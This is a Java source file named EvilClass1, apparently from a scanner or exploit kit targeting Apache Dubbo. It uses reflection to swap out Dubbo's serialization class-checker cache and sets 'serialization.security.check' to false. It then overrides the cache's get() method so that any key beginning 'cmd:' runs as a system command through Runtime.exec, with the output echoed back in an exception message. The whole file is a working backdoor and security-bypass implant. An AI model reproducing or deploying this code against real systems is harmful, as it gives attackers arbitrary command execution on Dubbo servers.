package scanner.utils;

import org.apache.dubbo.common.utils.LFUCache;
import org.apache.dubbo.common.utils.SerializeClassChecker;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.nio.charset.Charset;

public class EvilClass1 extends LFUCache {
    public static final String CMD_PREFIX = "cmd:";
    public static final String CMD_SPLIT = "@cmdEcho@";

    public EvilClass1(String a) throws Exception {

    }

    public EvilClass1() throws Exception {
        try {
            addClass();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public Object get(Object key) {
        StringBuilder b = new StringBuilder();
        if (key.toString().startsWith(CMD_PREFIX)) {
            b.append(CMD_SPLIT);
            try {
                Process p = Runtime.getRuntime().exec(key.toString().substring(5).split(" "));
                InputStream fis = p.getInputStream();
                InputStreamReader isr;
                if (key.toString().charAt(4) == 'g') {
                    isr = new InputStreamReader(fis, Charset.forName("GBK"));
                } else {
                    isr = new InputStreamReader(fis);
                }
                BufferedReader br = new BufferedReader(isr);
                String line;
                while ((line = br.readLine()) != null) {
                    b.append(line).append("\n");
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            b.append(CMD_SPLIT);
            throw new IllegalArgumentException(b.toString());
        }
        return super.get(key);
    }

    public static void addClass() throws Exception {
        System.out.println("insert success");
        System.setProperties(null);
        System.setProperty("serialization.security.check", "false");
        Field mo = Field.class.getDeclaredField("modifiers");
        mo.setAccessible(true);
        Field field = SerializeClassChecker.class.getDeclaredField("CLASS_ALLOW_LFU_CACHE");
        field.setAccessible(true);
        mo.setInt(field, field.getModifiers() & ~Modifier.FINAL);
        SerializeClassChecker serializeClassChecker = SerializeClassChecker.getInstance();
        field.set(serializeClassChecker, new EvilClass1(""));
        System.out.println("add success");
    }

    public static void main(String[] args) throws Exception {
        new EvilClass1();
    }
}
